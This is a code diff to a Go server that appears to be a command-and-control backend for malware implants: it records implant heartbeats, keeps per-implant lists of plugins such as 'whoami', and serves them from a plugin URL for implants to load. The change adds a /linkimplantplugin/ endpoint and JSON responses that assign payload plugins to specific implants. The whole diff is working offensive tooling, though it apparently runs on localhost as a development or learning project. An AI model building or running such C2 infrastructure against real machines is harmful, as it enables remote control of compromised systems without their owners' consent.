@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -70,8 +71,9 @@ func postHeartbeat(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 	pluginsToReturn := implants[hostname].PluginsToLoad
+	jsonString, _ := json.Marshal(pluginsToReturn)
 	fmt.Println(implants)
-	io.WriteString(w, "[{\"pluginId\":\""+RandomString(16)+"\",\"pluginUrl\":\"http://localhost:3333/plugin/\",\"pluginName\":\"whoami\"}]")
+	io.WriteString(w, string(jsonString))
 }
 
 func postPlugin(w http.ResponseWriter, r *http.Request) {
@@ -123,24 +125,33 @@ func postAddToKnownPlugins(w http.ResponseWriter, r *http.Request) {
 }
 
 func postAddPluginToImplant(w http.ResponseWriter, r *http.Request) {
-	r.ParseForm()
+	err := r.ParseForm()
+	CheckError(err)
 	pluginName := r.Form.Get("pluginname")
 	implantName := r.Form.Get("implantname")
-	pluginToImplant := PluginFromC2{
-		PluginID:   RandomString(16),
-		PluginURL:  "http://localhost:3333/plugin/", //For now this is the only that is needed. Maybe change in the future
-		PluginName: pluginName,
+	fmt.Println("Plugin and implant to be linked", pluginName, implantName)
+	_, pluginOK := knownPlugins[pluginName]
+	_, implantok := implants[implantName]
+	if !pluginOK || !implantok {
+		io.WriteString(w, "Plugin or implant unknown. Please fix.")
+	} else {
+		pluginToImplant := PluginFromC2{
+			PluginID:   RandomString(16),
+			PluginURL:  "http://localhost:3333/plugin/", //For now this is the only that is needed. Maybe change in the future
+			PluginName: pluginName,
+		}
+		entry := implants[implantName]
+		entry.PluginsToLoad = append(implants[implantName].PluginsToLoad, pluginToImplant)
+		implants[implantName] = entry
+		io.WriteString(w, "Added "+pluginName+" to "+implantName)
 	}
-	entry := implants[implantName]
-	entry.PluginsToLoad = append(implants[implantName].PluginsToLoad, pluginToImplant)
-	implants[implantName] = entry
-	io.WriteString(w, "Added "+pluginName+" to "+implantName)
 }
 
 func main() {
 	http.HandleFunc("/", postHeartbeat)
 	http.HandleFunc("/plugin/", postPlugin)
 	http.HandleFunc("/addplugin/", postAddToKnownPlugins)
+	http.HandleFunc("/linkimplantplugin/", postAddPluginToImplant)
 
 	err := http.ListenAndServe(":3333", nil)
 	CheckError(err)
